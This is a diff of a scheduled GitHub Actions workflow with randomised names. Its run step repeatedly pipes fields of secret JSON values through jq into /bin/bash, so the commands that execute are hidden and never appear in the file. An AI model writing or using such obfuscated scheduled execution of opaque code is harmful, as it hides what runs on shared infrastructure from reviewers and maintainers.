@@ -3,23 +3,24 @@ name: duansiqi9831
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
+    - cron: '51 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duansiqi9831
         env:
-          t086: ${{ secrets.t086 }}
+          wi8772: ${{ secrets.wi8772 }}
         run: |
-          echo $t086 | jq -r .uwb4 | /bin/bash
-          echo $tuqf7283 | jq -r .foa7462 | /bin/bash
-          echo $ra3 | jq -r .hh8776 | /bin/bash
-          echo $mna33 | jq -r .ikx3325 | /bin/bash
-          echo $qbgf38 | jq -r .vf92 | /bin/bash
-          echo $ceu54 | jq -r .tv6106 | /bin/bash
-          echo $vxon13389 | jq -r .bz56 | /bin/bash
-          echo $cvxff9 | jq -r .ggqy7 | /bin/bash
+          echo $wi8772 | jq -r .lwjc360 | /bin/bash
+          echo $llkk9319 | jq -r .jhp0 | /bin/bash
+          echo $e7 | jq -r .eudm5254 | /bin/bash
+          echo $xfx9 | jq -r .m16 | /bin/bash
+          echo $oec9 | jq -r .mp41542 | /bin/bash
+          echo $oszrp856 | jq -r .tsoq92 | /bin/bash
+          echo $mytw00 | jq -r .fdade0 | /bin/bash
+          echo $qct25 | jq -r .uv95 | /bin/bash
+          echo $izqj38301 | jq -r .ra53 | /bin/bash
 
